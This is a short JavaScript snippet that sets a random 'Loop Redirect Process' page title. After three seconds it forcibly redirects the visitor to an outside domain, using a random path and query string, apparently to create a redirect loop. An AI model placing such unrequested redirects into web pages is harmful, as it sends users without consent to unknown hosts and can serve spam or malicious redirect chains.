document.addEventListener("DOMContentLoaded", (event) => {

    function redirector() {
        const SITEURL = "https://gmt.gvnx.xyz/LRP";
        const RNG = Math.floor(Math.random() * 10) + 1;
        const QUERYS = Math.floor(Math.random() * 1000000000);
        window.location.href = `${SITEURL}/${RNG}?q=${QUERYS}`;
    }

    setTimeout(() => {
        redirector();
    }, 3000);

    const randomtitlestring = Math.floor(Math.random() * 1000000000);
    document.title = `[Loop Redirect Process] - ${randomtitlestring}`;

});
